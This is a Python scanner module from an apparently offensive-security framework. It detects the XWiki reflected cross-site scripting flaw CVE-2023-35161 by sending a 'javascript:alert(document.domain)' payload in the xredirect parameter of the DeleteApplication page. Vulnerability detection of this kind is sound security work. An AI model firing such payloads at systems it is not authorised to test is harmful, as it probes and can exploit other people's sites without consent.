#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki >= 6.2-milestone-1 - Cross-Site Scripting Detection',
        'description': "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Users are able to forge an URL with a payload allowing to inject Javascript in the page (XSS). It's possible to exploit the DeleteApplication page to perform a XSS, e.g. by using URL such as: > xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain). This vulnerability exists since XWiki 6.2-milestone-1. The vulnerability has been patched in XWiki 14.10.5 and 15.1-rc-1.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-20614', 'https://nvd.nist.gov/vuln/detail/CVE-2023-35161'],
        'cve': 'CVE-2023-35161',
    }

    def run(self):
        for path in ('/xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain)', '/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain)'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code not in (200, 401):
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('javascript:alert(document.domain)', 'DeleteApplication', 'data-xwiki',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="XWiki >= 6.2-milestone-1 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

